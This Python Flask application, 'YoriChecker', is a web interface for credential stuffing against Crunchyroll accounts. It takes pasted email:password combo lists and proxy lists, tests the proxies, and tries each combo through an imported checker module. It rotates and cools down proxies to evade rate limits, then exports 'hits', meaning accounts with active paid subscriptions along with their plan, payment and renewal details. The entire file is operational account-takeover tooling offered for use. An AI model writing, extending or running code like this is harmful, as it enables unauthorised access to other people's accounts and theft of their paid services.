import os
import io
import json
import time
import uuid
import threading
import requests
from flask import Flask, request, render_template_string, send_file, Response
from concurrent.futures import ThreadPoolExecutor, as_completed
from checker import CrunchyrollChecker

app = Flask(__name__)

tasks = {}
task_lock = threading.Lock()

class SmartProxyManager:
    def __init__(self, proxies):
        self.active = list(proxies)
        self.cooldown = {}
        self.lock = threading.Lock()
        self.empty = len(proxies) == 0

    def get_proxy(self):
        if self.empty:
            return None
            
        wait_time = 0
        while wait_time < 30:
            with self.lock:
                if self.active:
                    return self.active.pop(0)
                
                now = time.time()
                resurrected = [p for p, t in self.cooldown.items() if t <= now]
                for p in resurrected:
                    self.active.append(p)
                    del self.cooldown[p]
                    
                if self.active:
                    return self.active.pop(0)
            
            time.sleep(1)
            wait_time += 1
            
        return None

    def report_success(self, proxy):
        if not proxy: return
        with self.lock:
            if proxy not in self.active:
                self.active.append(proxy)

    def report_rate(self, proxy, cooldown_seconds=60):
        if not proxy: return
        with self.lock:
            if proxy in self.active:
                self.active.remove(proxy)
            self.cooldown[proxy] = time.time() + cooldown_seconds

    def report_dead(self, proxy):
        if not proxy: return
        with self.lock:
            if proxy in self.active:
                self.active.remove(proxy)
            if proxy in self.cooldown:
                del self.cooldown[proxy]

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YoriChecker // Brutalist</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap');
        
        body {
            background: #111;
            color: #eee;
            font-family: 'Space Mono', monospace;
            margin: 0;
            padding: 20px;
        }
        .container { max-width: 1100px; margin: 0 auto; }
        h1 {
            text-transform: uppercase;
            letter-spacing: 2px;
            border-bottom: 4px solid #ff5500;
            padding-bottom: 10px;
            text-shadow: 4px 4px 0px #000;
            margin-top: 0;
            color: #ff5500;
        }
        .panels { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .panel {
            flex: 1;
            min-width: 300px;
            background: #222;
            border: 3px solid #444;
            box-shadow: 10px 10px 0px #000;
            padding: 15px;
        }
        .panel h3 {
            margin-top: 0;
            border-bottom: 2px solid #555;
            padding-bottom: 5px;
            text-transform: uppercase;
            color: #00ffaa;
        }
        textarea {
            width: 100%;
            height: 150px;
            background: #000;
            color: #00ffaa;
            border: 2px solid #555;
            padding: 10px;
            font-family: 'Space Mono', monospace;
            box-sizing: border-box;
            box-shadow: inset 4px 4px 0px #111;
        }
        input[type="file"] {
            margin-top: 10px;
            color: #ccc;
            display: block;
            font-family: 'Space Mono', monospace;
        }
        .btn {
            background: #ff5500;
            color: #000;
            border: 3px solid #000;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 8px 8px 0px #000;
            transition: transform 0.1s, box-shadow 0.1s;
            font-family: 'Space Mono', monospace;
            width: 100%;
            margin-top: 20px;
        }
        .btn:hover { transform: translate(2px, 2px); box-shadow: 6px 6px 0px #000; }
        .btn:active { transform: translate(8px, 8px); box-shadow: 0px 0px 0px #000; }
        .btn:disabled {
            background: #555;
            color: #888;
            cursor: not-allowed;
            box-shadow: 8px 8px 0px #000;
            transform: none;
        }
        .btn-small {
            background: #00ffaa;
            color: #000;
            border: 2px solid #000;
            padding: 8px 15px;
            font-size: 14px;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 5px 5px 0px #000;
            margin-top: 10px;
            font-family: 'Space Mono', monospace;
            transition: transform 0.1s, box-shadow 0.1s;
        }
        .btn-small:hover { transform: translate(1px, 1px); box-shadow: 4px 4px 0px #000; }
        .btn-small:active { transform: translate(5px, 5px); box-shadow: 0px 0px 0px #000; }
        .btn-small:disabled {
            background: #555;
            color: #888;
            cursor: not-allowed;
            box-shadow: 5px 5px 0px #000;
            transform: none;
        }
        #logArea {
            background: #000;
            border: 3px solid #444;
            box-shadow: 10px 10px 0px #000;
            height: 300px;
            overflow-y: scroll;
            padding: 15px;
            font-size: 13px;
            color: #00ffaa;
            white-space: pre-wrap;
            margin-top: 20px;
            font-family: 'Space Mono', monospace;
        }
        #downloadBtn {
            display: none;
            background: #00ffaa;
            color: #000;
        }
        .status-text {
            margin-top: 10px;
            font-weight: bold;
            color: #ff5500;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>YoriChecker // Crunchyroll</h1>
        
        <div class="panels">
            <div class="panel">
                <h3>Combos</h3>
                <textarea id="combos_text" placeholder="email:pass"></textarea>
                <input type="file" id="combos_file" accept=".txt" onchange="loadFile(this, 'combos_text')">
            </div>
            <div class="panel">
                <h3>Proxies</h3>
                <textarea id="proxies_text" placeholder="ip:port:user:pass or ip:port"></textarea>
                <input type="file" id="proxies_file" accept=".txt" onchange="loadFile(this, 'proxies_text')">
                <button class="btn-small" id="validateBtn" onclick="validateProxies()">VALIDATE PROXIES</button>
                <div class="status-text" id="proxyStatus">Load proxies to begin.</div>
            </div>
        </div>
        
        <button class="btn" id="startBtn" disabled onclick="startChecking()">START CHECKING</button>
        
        <div id="logArea">[System] Awaiting input...</div>
        
        <button class="btn" id="downloadBtn">DOWNLOAD RESULTS</button>
    </div>

    <script>
        let workingProxies = [];
        let combosLoaded = false;
        let proxiesValidated = false;

        function loadFile(input, textareaId) {
            const file = input.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = function(e) {
                const textarea = document.getElementById(textareaId);
                textarea.value = textarea.value ? textarea.value + '\\n' + e.target.result : e.target.result;
                updateStartButton();
            };
            reader.readAsText(file);
        }

        function updateStartButton() {
            combosLoaded = document.getElementById('combos_text').value.trim().length > 0;
            document.getElementById('startBtn').disabled = !(combosLoaded && proxiesValidated);
        }

        document.getElementById('combos_text').addEventListener('input', updateStartButton);

        async function processStream(url, payload, onMessage) {
            const response = await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            const reader = response.body.getReader();
            const decoder = new TextDecoder();
            let buffer = '';
            while(true) {
                const {done, value} = await reader.read();
                if(done) break;
                buffer += decoder.decode(value, {stream: true});
                const lines = buffer.split('\\n');
                buffer = lines.pop();
                for(const line of lines) {
                    if(line.startsWith('data: ')) {
                        try {
                            onMessage(JSON.parse(line.substring(6)));
                        } catch(e) {}
                    }
                }
            }
        }

        async function validateProxies() {
            const text = document.getElementById('proxies_text').value;
            const proxies = text.split('\\n').filter(l => l.trim());
            if (proxies.length === 0) {
                proxiesValidated = false;
                updateStartButton();
                return;
            }
            
            proxiesValidated = false;
            updateStartButton();
            document.getElementById('validateBtn').disabled = true;
            document.getElementById('proxyStatus').textContent = 'Validating...';
            
            const logArea = document.getElementById('logArea');
            logArea.innerHTML = '';
            
            await processStream('/validate_proxies', {proxies: proxies}, (data) => {
                if (data.log) {
                    logArea.innerHTML += data.log + '\\n';
                    logArea.scrollTop = logArea.scrollHeight;
                } else if (data.event === 'done') {
                    workingProxies = data.working_proxies;
                    logArea.innerHTML += `\\n${data.count}\\n`;
                    logArea.scrollTop = logArea.scrollHeight;
                    proxiesValidated = workingProxies.length > 0;
                    document.getElementById('validateBtn').disabled = false;
                    document.getElementById('proxyStatus').textContent = data.count;
                    updateStartButton();
                }
            });
        }

        async function startChecking() {
            const fullCombos = document.getElementById('combos_text').value;
            
            document.getElementById('startBtn').disabled = true;
            document.getElementById('startBtn').textContent = 'CHECKING...';
            document.getElementById('logArea').innerHTML = '';
            
            await processStream('/check', {combos: fullCombos, working_proxies: workingProxies}, (data) => {
                if (data.log) {
                    document.getElementById('logArea').innerHTML += data.log + '\\n';
                    document.getElementById('logArea').scrollTop = document.getElementById('logArea').scrollHeight;
                } else if (data.event === 'done') {
                    document.getElementById('downloadBtn').style.display = 'block';
                    document.getElementById('downloadBtn').onclick = () => {
                        window.location.href = `/download/${data.task_id}`;
                    };
                    document.getElementById('startBtn').textContent = 'START CHECKING';
                    document.getElementById('startBtn').disabled = false;
                }
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/health')
def health():
    return "OK", 200

@app.route('/validate_proxies', methods=['POST'])
def validate_proxies():
    data = request.json
    proxies = [p.strip() for p in data.get('proxies', []) if p.strip()]
    
    def stream():
        working = []
        for p in proxies:
            try:
                proxy_dict = {"http": p, "https": p}
                r = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=7)
                if r.status_code == 200:
                    yield f"data: {json.dumps({'log': f'Testing {p}... ✓ working', 'working': True})}\n\n"
                    working.append(p)
                else:
                    yield f"data: {json.dumps({'log': f'Testing {p}... ✗ failed (status {r.status_code})', 'working': False})}\n\n"
            except Exception as e:
                yield f"data: {json.dumps({'log': f'Testing {p}... ✗ failed ({str(e)[:20]})', 'working': False})}\n\n"
        
        yield f"data: {json.dumps({'event': 'done', 'working_proxies': working, 'count': f'Found {len(working)} working proxies out of {len(proxies)}'})}\n\n"
        
    return Response(stream(), mimetype='text/event-stream')

@app.route('/check', methods=['POST'])
def check():
    data = request.json
    combos_raw = data.get('combos', '')
    working_proxies = data.get('working_proxies', [])
    
    combos = []
    for line in combos_raw.splitlines():
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                combos.append((parts[0], parts[1]))
                
    task_id = str(uuid.uuid4())
    
    proxy_manager = SmartProxyManager(working_proxies)
    results = []
    results_lock = threading.Lock()
    logs = []
    logs_lock = threading.Lock()
    
    def log(msg):
        with logs_lock:
            ts = time.strftime("%H:%M:%S")
            logs.append(f"[{ts}] {msg}")

    def check_combo(email, password):
        max_attempts = 5
        attempts = 0
        
        while attempts < max_attempts:
            proxy = proxy_manager.get_proxy()
            
            log(f"Checking {email} with proxy {proxy or 'DIRECT'}...")
            
            class SingleProxyMgr:
                def __init__(self, p): self.p = p
                def get_proxy(self): return self.p
                def mark_bad(self): pass
            
            checker = CrunchyrollChecker(SingleProxyMgr(proxy) if proxy else None)
            res = checker.check_account(email, password)
            status = res.get('status')
            
            if status == 'HIT':
                proxy_manager.report_success(proxy)
                log(f"{email} -> HIT!")
                return res
                
            elif status in ['INVALID', 'FREE']:
                proxy_manager.report_success(proxy)
                log(f"{email} -> BAD ({status})")
                res['status'] = 'BAD'
                res['error'] = status
                return res
                
            else:
                proxy_manager.report_rate(proxy, cooldown_seconds=60)
                log(f"Proxy {proxy or 'DIRECT'} hit RATE/ERROR ({status}). Cooldown 60s.")
                attempts += 1
                time.sleep(2)
                
        log(f"{email} -> RATE (max retries exhausted)")
        return {'email': email, 'password': password, 'status': 'RATE', 'data': {}, 'error': 'Max retries exhausted'}

    def run():
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(check_combo, e, p): (e, p) for e, p in combos}
            for future in as_completed(futures):
                res = future.result()
                with results_lock:
                    results.append(res)
        
        with task_lock:
            tasks[task_id] = results

    threading.Thread(target=run).start()
    
    def stream():
        last_log_idx = 0
        while True:
            with logs_lock:
                current_logs = list(logs)
            
            for i in range(last_log_idx, len(current_logs)):
                yield f"data: {json.dumps({'log': current_logs[i]})}\n\n"
            last_log_idx = len(current_logs)
            
            with task_lock:
                if task_id in tasks:
                    yield f"data: {json.dumps({'event': 'done', 'task_id': task_id})}\n\n"
                    break
            
            time.sleep(0.5)
            
    return Response(stream(), mimetype='text/event-stream')

@app.route('/download/<task_id>')
def download(task_id):
    with task_lock:
        task_results = tasks.get(task_id, [])
        
    hits = []
    bads = []
    rates = []

    for res in task_results:
        e = res.get('email', '')
        p = res.get('password', '')
        status = res.get('status')
        
        if status == 'HIT':
            d = res.get('data', {})
            hits.append(f"{e}:{p} | Plan: {d.get('plan', 'N/A')} | Expires: {d.get('expires', 'N/A')} | Country: {d.get('country', 'N/A')} | Auto-Renew: {d.get('renew', 'N/A')} | Streams: {d.get('streams', 'N/A')} | Payment: {d.get('payment', 'N/A')} | SKU: {d.get('sku', 'N/A')}")
        elif status == 'BAD':
            reason = res.get('error', 'Invalid or Free')
            bads.append(f"{e}:{p} | {reason}")
        else:
            reason = res.get('error', 'Rate limit / Network Error')
            rates.append(f"{e}:{p} | {reason}")

    sep = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    output = []
    output.append(sep)
    output.append("HITS (Active Paid Subscriptions)")
    output.append(sep)
    output.extend(hits)
    output.append("\n" + sep)
    output.append("BAD (Invalid / Free)")
    output.append(sep)
    output.extend(bads)
    output.append("\n" + sep)
    output.append("RATE (Rate Limits / Network Errors)")
    output.append(sep)
    output.extend(rates)
    output.append("\n" + sep)
    output.append(f"SUMMARY: TOTAL HITS: {len(hits)} | BAD: {len(bads)} | RATE: {len(rates)}")
    output.append(sep)

    mem = io.BytesIO(("\n".join(output)).encode('utf-8'))
    return send_file(mem, as_attachment=True, download_name='YoriChecker.vercel.app.txt', mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
